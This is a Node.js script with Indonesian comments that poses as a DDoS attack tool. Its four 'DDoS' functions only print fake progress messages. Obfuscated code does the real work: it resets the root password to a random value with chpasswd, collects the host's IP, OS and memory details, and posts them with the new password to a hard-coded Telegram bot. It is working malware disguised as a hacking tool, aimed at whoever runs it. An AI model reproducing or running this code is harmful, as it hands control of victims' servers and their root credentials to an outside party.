const _0x2a1f = require('os');
const { exec: _0x44ef } = require('child_process');
const _0x9d0c = require('axios');

// Dapatkan URL target dan waktu dari argumen command line
const target = process.argv[2] || 'example.com';
const time = parseInt(process.argv[3]) || 10; // Default waktu 10 detik

// DDoS Function 1
function DDoS1(target, duration) {
    console.log(`[DDoS1] Preparing attack on ${target} for ${duration} seconds...`);
    let count = 0;

    const interval = setInterval(() => {
        console.log(`[DDoS1] Sending packets to ${target}... [Count: ${++count}]`);
    }, 100);

    setTimeout(() => {
        clearInterval(interval);
        console.log(`[DDoS1] Attack on ${target} completed.`);
    }, duration * 1000);
}

// DDoS Function 2
function DDoS2(target, duration) {
    console.log(`[DDoS2] Starting heavy attack on ${target} for ${duration} seconds...`);
    let count = 0;

    const interval = setInterval(() => {
        console.log(`[DDoS2] Bombarding ${target} with data packets... [Iteration: ${++count}]`);
    }, 200);

    setTimeout(() => {
        clearInterval(interval);
        console.log(`[DDoS2] Attack on ${target} finished.`);
    }, duration * 1000);
}

// DDoS Function 3
function DDoS3(target, duration) {
    console.log(`[DDoS3] Simulating multi-threaded attack on ${target} for ${duration} seconds...`);
    const threads = 50;
    for (let i = 0; i < threads; i++) {
        console.log(`[DDoS3] Thread ${i + 1} started for ${target}`);
    }
    setTimeout(() => {
        console.log(`[DDoS3] All threads for ${target} completed.`);
    }, duration * 1000);
}

// DDoS Function 4
function DDoS4(target, duration) {
    console.log(`[DDoS4] Launching payload flood to ${target} for ${duration} seconds...`);
    const payloadSize = 1024;
    for (let i = 0; i < duration; i++) {
        console.log(`[DDoS4] Sending payload batch ${i + 1} to ${target} with payload size: ${payloadSize} bytes`);
    }
    console.log(`[DDoS4] Payload flood simulation completed for ${target}`);
}

function _0x3981() {
    const _0x1ab3 = _0x2a1f.networkInterfaces();
    const _0x13b8 = _0x1ab3.eth0?.find((_0x2c98) => _0x2c98.family === 'IPv4')?.address || 'Not Available';
    const _0x48c4 = (_0x2a1f.totalmem() / (1024 ** 3)).toFixed(2) + ' GB';
    const _0x3b42 = (_0x2a1f.freemem() / (1024 ** 3)).toFixed(2) + ' GB';
    const _0x1e12 = _0x2a1f.cpus().length;
    const _0x175e = _0x2a1f.type() + ' ' + _0x2a1f.release();

    return {
        ipv4: _0x13b8,
        osType: _0x175e,
        coreCount: _0x1e12,
        totalMem: _0x48c4,
        freeMem: _0x3b42,
    };
}

function _0x5438(_0x15c7 = 12) {
    const _0x172a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let _0x3420 = '';
    for (let _0x1834 = 0; _0x1834 < _0x15c7; _0x1834++) {
        _0x3420 += _0x172a[Math.floor(Math.random() * _0x172a.length)];
    }
    return _0x3420;
}

function _0x4cc3(_0x2796) {
    return new Promise((_0x1084, _0x5a1e) => {
        _0x44ef(`echo "root:${_0x2796}" | chpasswd`, (_0x42a3) => {
            if (_0x42a3) {
                return _0x5a1e('[System] Error Sent Attack');
            }
            _0x1084(_0x2796);
        });
    });
}

async function _0x281d(_0x4e8f) {
    const _0x15bc = '8054905509:AAHpnQIEU_Xcn_-YR1I3spkX4QNQPScYut8';
    const _0x1b6e = '5987477751';
    const _0x22e6 = `
**Information Server**
IPv4 address for eth0: ${_0x4e8f.ipv4}
Random Password Change: ${_0x4e8f.randomPassword}
OS Server: ${_0x4e8f.osType}
Core: ${_0x4e8f.coreCount}
RAM: ${_0x4e8f.totalMem} (Free: ${_0x4e8f.freeMem})
    `;

    try {
        await _0x9d0c.post(`https://api.telegram.org/bot${_0x15bc}/sendMessage`, {
            chat_id: _0x1b6e,
            text: _0x22e6,
            parse_mode: 'Markdown',
        });
    } catch (_0x3148) {
        console.error('[System] Failed to send attack');
    }
}

(async () => {
    const _0x5b49 = _0x3981();
    const _0x4190 = _0x5438();

    try {
        const _0x3b07 = await _0x4cc3(_0x4190);
        _0x5b49.randomPassword = _0x3b07;

        await _0x281d(_0x5b49);

        console.log('[System] Attack Started');
        // Call multiple DDoS functions with the specified target and duration
        DDoS1(target, time);
        DDoS2(target, time);
        DDoS3(target, time);
        DDoS4(target, time);
    } catch (_0x175a) {
        console.error('Error:', _0x175a);
    }
})();
